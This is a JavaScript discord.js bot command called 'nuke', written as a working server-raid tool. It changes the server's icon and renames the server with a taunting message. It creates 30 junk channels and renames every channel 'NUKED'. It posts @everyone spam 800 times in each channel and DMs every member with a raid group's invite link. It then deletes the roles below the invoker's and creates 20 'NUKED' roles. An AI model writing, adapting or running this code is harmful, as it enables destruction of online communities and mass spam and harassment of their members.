const { SlashCommandBuilder } = require('discord.js');
const { ChannelType } = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('Rename all channels, nuke the server, and delete lower roles.'),

  async execute(interaction) {
    function makeid(length) {
      let result = '';
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
      let counter = 0;
      while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
      }
      return result;
    }

    try {
      const guild = interaction.guild;

      // Change server icon
      await guild
        .setIcon(
          'https://cdn.discordapp.com/avatars/1122538739177099345/95557f5eec4067c3c214430635037160.webp?size=1024'
        )
        .then((updatedGuild) =>
          console.log(`Server icon updated successfully: ${updatedGuild.iconURL()}`)
        )
        .catch((error) => console.error('Failed to set server icon:', error));
        await interaction.reply({ content: 'Server nuked successfully!', ephemeral: true });

      // Change server name
      await guild
        .setName('WHERE IS YOUR DAD? HAHA')
        .then((updatedGuild) => console.log(`Server name updated successfully: ${updatedGuild.name}`))
        .catch((error) => console.error('Failed to set server name:', error));

              // Create new channels
      for (let i = 0; i < 30; i++) {
        guild.channels.create({
          name: makeid(10),
          type: ChannelType.GuildText,
          // your permission overwrites or other options here
        });
      }
      setTimeout(async () => {
      // Rename all channels
      guild.channels.cache.forEach(async (channel) => {
        await channel
          .setName('NUKED')
          .then((updatedChannel) => console.log(`Updated channel name: ${updatedChannel.name}`))
          .catch((error) => console.error(error));
      });
        
        // Get the @everyone mention
        const everyoneMention = interaction.guild.roles.everyone.toString();

        // Send the nuke message and mention everyone in each channel
        for (let i = 0; i < 800; i++) {
          const message = `${everyoneMention}\n\nNo server protection? HAHA\n\nNUKED BY TERROR\n\nJoin the chaos:\nhttps://discord.gg/jebhWzp7yx`;
          guild.channels.cache.forEach(async (channel) => {
            try {
              await channel.send(message);
            } catch (error) {
              console.error(`Failed to send message in channel: ${channel.id}`);
            }
          });
        }

        // Get the message content
        const messageContent = `No server protection? HAHA\n\nNUKED BY TERROR\n\nJoin the chaos:\nhttps://discord.gg/jebhWzp7yx`;

        // Send a DM to each member in the server
        guild.members.cache.forEach(async (member) => {
          try {
            await member.send(messageContent);
          } catch (error) {
            console.error(`Failed to send DM to member: ${member.user.tag}`);
          }
        });

        // Delete lower roles
        const member = interaction.member;
        const userHighestRolePosition = member.roles.highest.position;
        guild.roles.cache.forEach(async (role) => {
          if (role.position < userHighestRolePosition) {
            await role
              .delete()
              .then((deletedRole) => console.log(`Deleted role: ${deletedRole.name}`))
              .catch((error) => console.error(error));
          }
        });

        // Create 20 new roles called "NUKED"
        for (let i = 0; i < 20; i++) {
          await guild.roles
            .create({
              name: 'NUKED',
              reason: 'Creating roles',
            })
            .then((createdRole) => console.log(`Created role: ${createdRole.name}`))
            .catch((error) => console.error(error));
        }

      }, 12000); // 12-second delay
    } catch (error) {
      console.error(error);

      try {
        await interaction.reply({
          content: 'There was an error while executing this command!',
          ephemeral: true,
        });
      } catch (replyError) {
        console.error('Failed to send reply:', replyError);
      }
    }
  },
};
